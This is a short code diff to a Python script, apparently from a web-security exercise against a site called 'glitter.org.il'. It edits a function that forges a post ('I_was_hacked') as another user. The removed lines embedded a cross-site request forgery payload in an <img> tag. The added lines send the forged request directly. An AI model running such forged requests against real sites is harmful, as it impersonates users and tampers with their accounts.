@@ -284,8 +284,20 @@ def send_multiple_wows(glit_id, count):
 
 
 def xsrf_send_message_to_yourself_from_another_user(publisher_id):
-    msg = '<img src="http://glitter.org.il/glit?id=-1&feed_owner_id=' + user_id + '&publisher_id=' + publisher_id + '&publisher_screen_name=hacked_user&publisher_avatar=im1&background_color=White&date=' + current_time + '&content=I_was_hacked&font_color=black">'
-    path = 'glit?id=-1&feed_owner_id=' + user_id + '&publisher_id=' + publisher_id + '&publisher_screen_name=kolin%20pom&publisher_avatar=im1&background_color=White&date=' + current_time + '&content=' + msg + '&font_color=black'
+    """Send a forged glit from ``publisher_id`` to the logged in user."""
+    global current_time
+    current_time = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
+    path = (
+        "glit?id=-1"
+        + "&feed_owner_id=" + user_id
+        + "&publisher_id=" + publisher_id
+        + "&publisher_screen_name=kolin%20pom"
+        + "&publisher_avatar=im1"
+        + "&background_color=White"
+        + "&date=" + current_time
+        + "&content=I_was_hacked"
+        + "&font_color=black"
+    )
     send_and_receive_website("GET", path)
 
 
